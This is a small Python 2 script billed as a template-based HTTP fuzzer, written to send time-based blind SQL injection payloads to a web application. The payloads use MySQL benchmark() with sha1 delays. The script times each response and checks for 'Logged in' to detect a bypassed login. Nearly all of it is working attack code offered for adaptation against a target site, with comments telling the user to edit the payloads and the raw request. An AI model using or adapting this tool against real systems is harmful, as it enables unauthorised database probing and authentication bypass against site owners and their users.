#!/usr/bin/env python
__description__ = 'a template based http/web fuzzer'
__author__ = 'Francisco da Gama Tabanez Ribeiro'
__version__ = '0.1'
__date__ = '2012/08/25'
__license__ = 'GPLv3'

import httplib,urllib,string,time
url="https://www.blabla.bla/"
protocol=url.split(':')[0]
host=url.split('/')[2] #url.split(':')[1][2:]
print "> "+host

#pl=range(10)
pl=["%3E0'%2bbenchmark("+str(x)+"0000000,sha1(1))--%20" for x in range(10)] # edit this

def gen_test(payload):           # dump raw http request here and edit for fuzz
	return """GET /%s&rec=0&sls=0&eoh=0 HTTP/1.1
Host: 
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: 
Cookie: ASPSESSIONIDCCBQACRQ=BEMLIDLDFNADKLKLLOLKCPLA; ASPSESSIONIDACBTDDQQ=LMNHOIKDEBDMIPEGEGOIEIKJ


""" % payload

# put code to detect valid login
def filter_response(m):
	return m.find("Logged in") > 0
	
# returns method:string, path:string, headers:dict
def http_payload2request(message,params=''):
	headers={}
	for header in message[1:]:
		if (header != '' and header.find(':')):
			headers[header.split(':')[0]]=header[header.find(':')+2:]
	return message[0].split()[0], message[0].split()[1], headers

def conn(host,protocol='http'):
        if(string.lower(protocol)=='http'):
                c=httplib.HTTPConnection(host)
        elif(string.lower(protocol)=='https'):
                c=httplib.HTTPSConnection(host)
        else:
                print("something went wrong with protocol definition")
	return c

con = conn(host,protocol)

for payload in pl:
	message=gen_test(payload)
	method,path,headers=http_payload2request(message.split('\n'))
	con.request(method,path,"",headers)
	start=time.time()
	response= con.getresponse()
	print "================"
	print "PAYLOAD: "+payload, "\tLogged In? "+str(filter_response(response.read()))
	print response.status, time.time()-start
	#print response.read(), response.msg # response.getheaders()

con.close()
